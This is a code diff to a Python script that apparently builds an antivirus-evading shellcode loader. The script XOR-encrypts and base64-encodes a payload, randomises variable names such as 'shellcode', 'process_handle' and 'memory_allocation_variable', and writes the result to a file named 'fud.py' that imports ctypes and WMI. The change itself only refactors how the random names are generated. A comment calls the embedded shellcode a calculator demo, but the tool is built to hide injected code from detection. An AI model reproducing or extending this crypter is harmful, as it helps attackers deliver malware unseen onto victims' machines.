@@ -8,34 +8,38 @@ import random
 charset = string.ascii_lowercase+string.ascii_uppercase
 keycharset = string.digits+string.ascii_lowercase+string.ascii_uppercase
 
-replacements = {
-    '[amount]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[found]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[currkey]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[encrypted]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[xor]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[c]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[k]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[toret]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[message]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[key]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[decrypted]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[frombuffer]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[WMI]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[processes]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[procval]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[process_id]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[exceptions]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[shellcode]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[process_handle]': ''.join(random.choice(charset) for x in range(random.randint(3, 40))),
-    '[memory_allocation_variable]': ''.join(random.choice(charset) for x in range(random.randint(3, 40)))
-}
+replacements = [
+    '[amount]',
+    '[found]',
+    '[currkey]',
+    '[encrypted]',
+    '[xor]',
+    '[c]',
+    '[k]',
+    '[toret]',
+    '[message]',
+    '[key]',
+    '[decrypted]',
+    '[frombuffer]',
+    '[WMI]',
+    '[processes]',
+    '[procval]',
+    '[process_id]',
+    '[exceptions]',
+    '[shellcode]',
+    '[process_handle]',
+    '[memory_allocation_variable]'
+]
 
-getobjectvar = ''.join(random.choice(charset) for x in range(random.randint(3, 40)))
-hl = ''.join(random.choice(charset) for x in range(random.randint(3, 40)))
-bed = ''.join(random.choice(charset) for x in range(random.randint(3, 40)))
-stst = ''.join(random.choice(charset) for x in range(random.randint(3, 40)))
-itools = ''.join(random.choice(charset) for x in range(random.randint(3, 40)))
+def getRandomString():
+    return ''.join(random.choice(charset) for x in range(random.randint(3, 40)))
+
+
+getobjectvar = getRandomString()
+hl = getRandomString()
+bed = getRandomString()
+stst = getRandomString()
+itools = getRandomString()
 
 # DISCLAIMER: This is a calculator shellcode.
 # DO NOT USE IT if you are suspicious.
@@ -76,8 +80,8 @@ encrypted = base64.encodestring(xor(payload, randomKey)).replace('\n', '')
 source = source.replace('[CRYPTED]', encrypted)
 source = source.replace('[MD5SUM]', md5sum)
 
-for key, value in replacements.iteritems():
-    source = source.replace(key, value)
+for z in replacements:
+    source = source.replace(z, getRandomString())
 
 source = source.replace('[GEOBJECT]', getobjectvar)
 source = source.replace('[HL]', hl)
@@ -85,7 +89,7 @@ source = source.replace('[bed]', bed)
 source = source.replace('[stst]', stst)
 source = source.replace('[itools]', itools)
 
-with open('fud.py', 'w') as final:
+with open('fud.py', 'wb') as final:
     final.write('from ctypes import *\n')
     final.write('from win32com.client import GetObject as %s\n' % getobjectvar)
     final.write('import hashlib as %s\n' % hl)
